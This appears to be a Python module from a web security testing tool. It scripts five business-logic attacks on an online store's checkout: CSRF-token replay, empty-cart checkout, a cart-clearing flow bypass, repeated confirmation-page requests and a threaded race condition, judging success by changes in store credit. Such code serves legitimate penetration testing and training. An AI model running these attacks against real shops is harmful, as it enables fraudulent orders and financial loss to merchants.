from core.requester import Requester
from core.parser import Parser
import threading
import time


class CheckoutManipulationExploit:
    """
    Detects business logic flaws in the checkout workflow.
    
    Tests for:
    - Double/replay checkout attacks
    - Checkout without cart validation
    - Flow bypass vulnerabilities
    - Order confirmation reuse flaws
    - Race condition exploits
    """

    def __init__(self, session, config: dict):
        self.requester = Requester(session, config)
        self.parser = Parser()
        self.base_url = config.get("base_url", "")
        self.product_id = "1"  # Default product (jacket)
        self.test_results = {}

    # ------------------------------------------------------------------
    # HELPERS
    # ------------------------------------------------------------------
    def _get_csrf(self) -> str | None:
        """Get CSRF token from cart page"""
        r = self.requester.get_cart()
        if not r:
            return None
        return self.parser.extract_csrf(r.text)

    def _get_store_credit(self) -> float | None:
        """Get current store credit from cart"""
        r = self.requester.get_cart()
        if not r:
            return None
        credit_str = self.parser.extract_store_credit(r.text)
        price = self.parser.parse_price(credit_str)
        return price

    def _add_product_to_cart(self, product_id: str = None) -> bool:
        """Add product to cart. Return True if successful."""
        if product_id is None:
            product_id = self.product_id
        
        r = self.requester.add_to_cart({
            "productId": product_id,
            "redir": "PRODUCT",
            "quantity": "1",
        })
        
        return r is not None

    def _perform_checkout(self, csrf: str) -> tuple[bool, str | None]:
        """
        Perform checkout with given CSRF token.
        Returns (success, response_html)
        """
        if not csrf:
            return False, None
        
        r = self.requester.post("/cart/checkout", {"csrf": csrf})
        
        if not r:
            return False, None
        
        # Check if order was processed (200 status or contains order confirmation)
        success = (r.status_code == 200)
        return success, r.text if success else None

    def _is_order_confirmation(self, html: str) -> bool:
        """Check if HTML contains order confirmation"""
        if not html:
            return False
        
        confirmation_markers = [
            "your order",
            "order is on its way",
            "order confirmation",
            "order confirmed",
            "congratulations",
        ]
        
        html_lower = html.lower()
        return any(marker in html_lower for marker in confirmation_markers)

    # ------------------------------------------------------------------
    # [1] DOUBLE CHECKOUT (Replay Attack)
    # ------------------------------------------------------------------
    def test_double_checkout(self) -> bool:
        """
        Test if sending the same checkout request twice processes two orders.
        This could lead to duplicate charges or unexpected state changes.
        """
        print("\n[ATTACK 1] Double Checkout (Replay Attack)")
        
        try:
            # Get initial state
            credit_before = self._get_store_credit()
            if credit_before is not None:
                print(f"  [*] Initial store credit: ${credit_before:.2f}")
            
            # Clear and add product
            self.requester.clear_cart()
            if not self._add_product_to_cart():
                print("  [-] Could not add product to cart")
                return False
            
            # Get CSRF
            csrf = self._get_csrf()
            if not csrf:
                print("  [-] Could not get CSRF token")
                return False
            
            # Perform first checkout
            print(f"  [*] Performing first checkout...")
            success1, html1 = self._perform_checkout(csrf)
            
            if not success1:
                print("  [-] First checkout failed")
                return False
            
            if not self._is_order_confirmation(html1):
                print("  [-] First checkout did not contain order confirmation")
                return False
            
            print(f"  [+] First checkout succeeded")
            
            # Get credit after first checkout
            credit_after_first = self._get_store_credit()
            if credit_after_first is not None:
                print(f"  [*] Credit after first checkout: ${credit_after_first:.2f}")
            
            # Attempt to replay the same checkout with same CSRF
            print(f"  [*] Replaying checkout with same CSRF token...")
            success2, html2 = self._perform_checkout(csrf)
            
            if not success2:
                print("  [-] Second checkout rejected - protected against replay")
                return False
            
            print(f"  [+] Second checkout accepted!")
            
            # Check if second checkout produced order confirmation
            is_confirmed = self._is_order_confirmation(html2)
            if not is_confirmed:
                print("  [-] Second checkout did not produce order confirmation")
                return False
            
            print(f"  [+] Second checkout produced order confirmation - vulnerable!")
            
            # Get credit after second checkout
            credit_after_second = self._get_store_credit()
            if credit_after_second is not None:
                print(f"  [*] Credit after second checkout: ${credit_after_second:.2f}")
                
                # Check if credit decreased again (indicating duplicate charge)
                if credit_before and credit_after_second < credit_after_first:
                    print(f"  [!!!] DOUBLE CHECKOUT FLAW — repeated checkout processed twice")
                    return True
            
            if is_confirmed:
                print(f"  [!!!] DOUBLE CHECKOUT FLAW — replay attack successful")
                return True
            
            return False
        
        except Exception as e:
            print(f"  [-] Error during test: {e}")
            return False

    # ------------------------------------------------------------------
    # [2] CHECKOUT WITHOUT CART
    # ------------------------------------------------------------------
    def test_checkout_without_cart(self) -> bool:
        """
        Test if checkout can be performed with an empty cart.
        Valid checkout should require items in cart.
        """
        print("\n[ATTACK 2] Checkout Without Cart")
        
        try:
            # Clear cart completely
            self.requester.clear_cart()
            print(f"  [*] Cleared cart")
            
            # Get CSRF from empty cart
            r = self.requester.get_cart()
            if not r:
                print("  [-] Could not access cart page")
                return False
            
            csrf = self.parser.extract_csrf(r.text)
            if not csrf:
                print("  [-] Could not extract CSRF from empty cart")
                return False
            
            print(f"  [*] Attempting checkout with empty cart...")
            
            # Attempt checkout without items
            success, html = self._perform_checkout(csrf)
            
            if not success:
                print(f"  [-] Checkout rejected - properly validated")
                return False
            
            print(f"  [+] Checkout accepted without items!")
            
            # Check if order was actually processed
            if self._is_order_confirmation(html):
                print(f"  [!!!] CHECKOUT WITHOUT CART FLAW — order processed with empty cart")
                return True
            
            print(f"  [-] Checkout accepted but order not confirmed")
            return False
        
        except Exception as e:
            print(f"  [-] Error during test: {e}")
            return False

    # ------------------------------------------------------------------
    # [3] CHECKOUT WITH MODIFIED FLOW
    # ------------------------------------------------------------------
    def test_flow_bypass(self) -> bool:
        """
        Test if clearing cart after getting CSRF but before checkout
        allows the order to still be processed.
        """
        print("\n[ATTACK 3] Checkout Flow Bypass (Clear Cart Before Checkout)")
        
        try:
            # Add product
            self.requester.clear_cart()
            if not self._add_product_to_cart():
                print("  [-] Could not add product")
                return False
            
            print(f"  [*] Added product to cart")
            
            # Get initial cart state
            r_before = self.requester.get_cart()
            if r_before:
                total_before = self.parser.extract_total(r_before.text)
                print(f"  [*] Cart total: {total_before}")
            
            # Get CSRF
            csrf = self._get_csrf()
            if not csrf:
                print("  [-] Could not get CSRF")
                return False
            
            # Clear cart BEFORE checkout
            print(f"  [*] Clearing cart BEFORE checkout...")
            self.requester.clear_cart()
            
            # Verify cart is empty
            r_empty = self.requester.get_cart()
            if r_empty and "product" in r_empty.text.lower():
                # Still has items - clear might have failed
                print("  [*] Cart still has items after clear")
            
            # Now try to checkout with the pre-obtained CSRF
            print(f"  [*] Attempting checkout with cleared cart...")
            success, html = self._perform_checkout(csrf)
            
            if not success:
                print(f"  [-] Checkout rejected - flow properly validated")
                return False
            
            print(f"  [+] Checkout accepted despite empty cart!")
            
            # Check if order was processed
            if self._is_order_confirmation(html):
                print(f"  [!!!] FLOW BYPASS FLAW — order processed after clearing cart")
                return True
            
            return False
        
        except Exception as e:
            print(f"  [-] Error during test: {e}")
            return False

    # ------------------------------------------------------------------
    # [4] REUSE ORDER CONFIRMATION
    # ------------------------------------------------------------------
    def test_confirmation_reuse(self) -> bool:
        """
        Test if order confirmation page can be replayed to generate
        additional credit or state changes.
        """
        print("\n[ATTACK 4] Order Confirmation Reuse")
        
        try:
            # Setup: clear and checkout
            self.requester.clear_cart()
            if not self._add_product_to_cart():
                print("  [-] Could not add product")
                return False
            
            # Get CSRF and checkout
            csrf = self._get_csrf()
            if not csrf:
                print("  [-] Could not get CSRF")
                return False
            
            print(f"  [*] Performing checkout...")
            success, html = self._perform_checkout(csrf)
            
            if not success or not self._is_order_confirmation(html):
                print(f"  [-] Checkout failed or no confirmation")
                return False
            
            # Get credit after first checkout
            credit_before = self._get_store_credit()
            if credit_before is not None:
                print(f"  [*] Store credit after checkout: ${credit_before:.2f}")
            
            # Try to access confirmation page multiple times
            print(f"  [*] Accessing confirmation page multiple times...")
            
            confirmation_accessed = 0
            for i in range(3):
                r = self.requester.get("/cart/order-confirmation?order-confirmed=true")
                if r and r.status_code == 200:
                    confirmation_accessed += 1
                    print(f"  [+] Confirmation request {i+1} succeeded")
                else:
                    print(f"  [-] Confirmation request {i+1} failed")
            
            if confirmation_accessed == 0:
                print("  [-] Could not access confirmation page")
                return False
            
            # Check if credit changed (indicating reuse vulnerability)
            credit_after = self._get_store_credit()
            if credit_after is not None:
                print(f"  [*] Store credit after replays: ${credit_after:.2f}")
                
                if credit_before is not None and credit_after > credit_before:
                    print(f"  [!!!] CONFIRMATION REUSE FLAW — credit increased from repeated access")
                    return True
            
            # Even without credit change, multiple successful accesses is suspicious
            if confirmation_accessed > 1:
                print(f"  [*] Confirmation page was accessible {confirmation_accessed} times")
            
            return False
        
        except Exception as e:
            print(f"  [-] Error during test: {e}")
            return False

    # ------------------------------------------------------------------
    # [5] CHECKOUT RACE CONDITION
    # ------------------------------------------------------------------
    def test_checkout_race(self) -> bool:
        """
        Test if multiple simultaneous checkout requests create multiple
        orders (race condition vulnerability).
        
        ONLY reports vulnerability if REAL IMPACT occurs:
        - Multiple order confirmations detected, OR
        - Store credit shows evidence of multiple charges
        
        HTTP 200 status alone is NOT sufficient for vulnerability.
        """
        print("\n[ATTACK 5] Checkout Race Condition")
        
        try:
            # Get initial state
            credit_before = self._get_store_credit()
            if credit_before is not None:
                print(f"  [*] Initial store credit: ${credit_before:.2f}")
            
            # Setup
            self.requester.clear_cart()
            if not self._add_product_to_cart():
                print("  [-] Could not add product")
                return False
            
            # Get CSRF
            csrf = self._get_csrf()
            if not csrf:
                print("  [-] Could not get CSRF")
                return False
            
            print(f"  [*] Sending multiple checkouts simultaneously...")
            
            results = []
            lock = threading.Lock()
            
            def send_checkout(attempt_num):
                success, html = self._perform_checkout(csrf)
                is_confirmed = self._is_order_confirmation(html) if html else False
                with lock:
                    results.append({
                        "success": success,
                        "confirmed": is_confirmed,
                        "attempt": attempt_num
                    })
            
            # Send 3 checkout requests concurrently
            threads = []
            for i in range(3):
                t = threading.Thread(target=send_checkout, args=(i+1,))
                threads.append(t)
                t.start()
            
            # Wait for all to complete
            for t in threads:
                t.join(timeout=10)
            
            # Analyze results - focus on ACTUAL order confirmations
            confirmed_orders = sum(1 for r in results if r["confirmed"])
            successful_requests = sum(1 for r in results if r["success"])
            
            print(f"  [*] Successful requests: {successful_requests}/3")
            print(f"  [*] Order confirmations: {confirmed_orders}/3")
            
            # Get final state
            credit_after = self._get_store_credit()
            if credit_after is not None:
                print(f"  [*] Final store credit: ${credit_after:.2f}")
            
            # VULNERABILITY RULE 1: Multiple order confirmations = race condition
            if confirmed_orders > 1:
                print(f"  [!!!] RACE CONDITION FLAW — {confirmed_orders} orders processed simultaneously")
                return True
            
            # VULNERABILITY RULE 2: Credit suggests multiple charges
            if credit_before is not None and credit_after is not None and credit_before > credit_after:
                credit_decrease = credit_before - credit_after
                # Heuristic: if credit decreased by more than 1.5x the typical item price ($1337),
                # it suggests multiple items were charged (race condition)
                if credit_decrease > 2000:
                    print(f"  [!!!] RACE CONDITION FLAW — evidence of multiple charges (${credit_decrease:.2f} decrease)")
                    return True
            
            # NO VULNERABILITY
            if confirmed_orders == 0:
                print(f"  [-] No race condition — no orders actually processed")
            else:
                print(f"  [-] No race condition — only 1 order processed")
            
            return False
        
        except Exception as e:
            print(f"  [-] Error during test: {e}")
            return False

    # ------------------------------------------------------------------
    # RUNNER
    # ------------------------------------------------------------------
    def run(self):
        print("[+] Starting Checkout Manipulation Module\n")
        
        results = {
            "double_checkout": self.test_double_checkout(),
            "no_cart_checkout": self.test_checkout_without_cart(),
            "flow_bypass": self.test_flow_bypass(),
            "confirmation_reuse": self.test_confirmation_reuse(),
            "checkout_race": self.test_checkout_race(),
        }
        
        # Print summary table
        print("\n" + "=" * 70)
        print("[+] CHECKOUT MANIPULATION SUMMARY TABLE")
        print("=" * 70)
        
        print(f"{'Vulnerability':<30} | {'Status':<20} | {'Result'}")
        print("-" * 70)
        
        for test, is_vulnerable in results.items():
            status = "[VULNERABLE] ✓" if is_vulnerable else "[SAFE]"
            result = "⚠️  Exploitable" if is_vulnerable else "✓ Protected"
            print(f"{test:<30} | {status:<20} | {result}")
        
        vulnerable_count = sum(1 for v in results.values() if v)
        total_count = len(results)
        
        print("=" * 70)
        print(f"[*] Summary: {vulnerable_count}/{total_count} vulnerabilities found")
        print("=" * 70)
        
        return any(results.values())
